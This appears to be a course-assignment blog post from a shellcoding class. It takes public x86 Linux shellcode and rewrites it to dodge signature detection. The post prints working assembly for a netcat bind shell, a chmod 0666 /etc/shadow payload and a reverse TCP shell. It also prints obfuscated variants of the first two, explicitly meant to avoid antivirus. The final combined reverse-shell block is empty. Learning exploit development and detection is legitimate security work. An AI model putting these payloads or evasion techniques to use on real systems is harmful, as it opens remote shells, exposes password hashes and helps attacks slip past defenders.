---
title:  Assignment 6
description: Create Polymorphic Versions of Sample Shellcode
order: 6
---

[&lt;&lt; Go Back]({{ site.baseurl }})


# {{ page.title }}
### {{ page.description }}
___
<div style="text-align:right;direction:ltr;margin-left:1em;"><h6>{{ page.date }}</h6></div>

For this assignment we will be creating polymorphic versions of sample shellcode from [shell-storm](shell-storm.org).

The first shellcode we will be transforming is the [netcat bindshell](http://shell-storm.org/shellcode/files/shellcode-804.php), shown below:

```nasm
; netcat_bind_shell.nasm
;  - Listen on port 13377 using netcat and provide shell
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-804.php

    global _start

section .text
_start:

        xor eax,eax
        xor edx,edx
        push 0x37373333         ; 7733
        push 0x3170762d         ; 1pv-
        mov edx, esp

        push eax
        push 0x68732f6e         ; hs/n
        push 0x69622f65         ; ib/e
        push 0x76766c2d         ; vvl-
        mov ecx,esp

        push eax
        push 0x636e2f2f         ; cn//
        push 0x2f2f2f2f         ; ////
        push 0x6e69622f         ; nib/
        mov ebx, esp

        push eax
        push edx
        push ecx
        push ebx
        xor edx,edx
        mov  ecx,esp
        mov al,11               ; execve
        int 0x80
```

It seems there are several ways we can morph this shellcode.  First, we should obfuscate all those push commands, since they contain the string we intend to execute.  We can do this by saving each string in a register first, adding a constant to it, then pushing it to the stack.  To save space, we'll use the first push command as the constant.  The next piece we should obfuscate is the **execve** syscall, since that could be seen as suspicious.  Below is the resulting shellcode:

```nasm
; netcat_bind_shell.nasm
;  - Listen on port 13377 using netcat and provide shell
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-804.php

    global _start

section .text
_start:

        xor eax,eax
        mov edi, 0x37373333
        push edi
        mov esi, 0x68a7a960     ; 0x3170762d
        sub esi, edi            ; ...
        push esi                ; ...
        mov edx, esp
        push eax
        mov esi, 0x313bfc3b     ; push 0x68732f6e
        add esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x322afc32     ; push 0x69622f65
        add esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x3f3f38fa     ; push 0x76766c2d
        add esi, edi            ; ...
        push esi                ; ...
        mov ecx,esp
        push eax
        mov esi, 0x2c36fbfc     ; push 0x636e2f2f
        add esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x66666262     ; push 0x2f2f2f2f
        sub esi, edi            ; ...
        push esi                ; ...
        mov esi, 0x37322efc     ; 0x6e69622f
        add esi, edi            ; ...
        push esi                ; ...
        mov ebx, esp
        push eax
        push edx
        push ecx
        push ebx
        xor edx,edx
        mov  ecx,esp
        mov al,10               ; mov al, 11
        inc eax                 ; ...
        int 0x80
```

The new shellcode is 85 bytes, about 37% more than the original 62 bytes.

Next, we'll look at the [chmod 0666 /etc/shadow](http://shell-storm.org/shellcode/files/shellcode-556.php) shellcode, reproduced below:

```nasm
; chmod_etc_shadow.nasm
;  - Execute chmod 0666 /etc/shadow and exit
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-556.php

    global _start

section .text
_start:

        xor eax,eax
        push eax

        push dword 0x776f6461   ; woda
        push dword 0x68732f2f   ; hs//
        push dword 0x6374652f   ; cte/
        mov ebx,esp

        push word 0x1b6
        pop ecx

        mov al,0xf              ; chmod
        int 0x80

        mov al,0x1              ; exit
        int 0x80
```

With this shellcode we'll try a different approach by adding nop-equivalent operations to obfuscate the pattern.  My morphed shellcode is shown below:

```nasm
; chmod_etc_shadow.nasm
;  - Execute chmod 0666 /etc/shadow and exit
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-556.php

    global _start

section .text
_start:

        sub ebx,ebx             ; xor eax,eax
        xchg eax,ebx            ; ...
        push eax

        push dword 0x776f6461   ; woda
        inc ebx
        lea ebx, [ecx]
        push dword 0x68732f2f   ; hs//
        push ecx
        add esp, 4
        push dword 0x6374652f   ; cte/
        mov ebx,esp
        mov ecx, eax

        push word 0x1b6
        pop ecx

        mov al,0x10             ; chmod
        dec eax
        int 0x80

        mov al,0x1              ; exit
        int 0x80
```

As you can see, we've obfuscated the placement of "/etc//shadow" on the stack by intermixing it with non-interactive operations.  Even though this may not seem as effective as the constant-addition method we used before, it only increased the shellcode by 11 bytes and still might avoid pattern recognition from antivirus.

Finally, we'll take a look at [Reverse TCP Shell](http://shell-storm.org/shellcode/files/shellcode-883.php) shellcode, reproduced below:

```nasm
; reverse_shell.nasm
;  - Execute a reverse tcp shell
;
; [LINK] http://shell-storm.org/shellcode/files/shellcode-883.php

    global _start

section .text
_start:

        push   0x66
        pop    eax
        push   0x1
        pop    ebx
        xor    edx,edx
        push   edx
        push   ebx
        push   0x2
        mov    ecx,esp
        int    0x80

        xchg   edx,eax
        mov    al,0x66
        push   0x101017f        ; 127.1.1.1
        push word  0x3905       ; port: 1337
        inc    ebx
        push   bx
        mov    ecx,esp
        push   0x10
        push   ecx
        push   edx
        mov    ecx,esp
        inc    ebx
        int    0x80

        push   0x2
        pop    ecx
        xchg   edx,ebx

loop:
        mov    al,0x3f
        int    0x80
        dec    ecx
        jns    loop

        mov    al,0xb
        inc    ecx
        mov    edx,ecx
        push   edx
        push   0x68732f2f       ; hs//
        push   0x6e69622f       ; nib/
        mov    ebx,esp
        int    0x80
```

For this polymorphic exercise, we'll combine the two methods used previously, resulting in the following:

```nasm

```

You can find the all the code to this challenge at [https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6](https://github.com/johneiser/SLAE/tree/master/assignments/Assignment_6).

<br>
{% include preamble.md %}

[&lt;&lt; Go Back]({{ site.baseurl }})
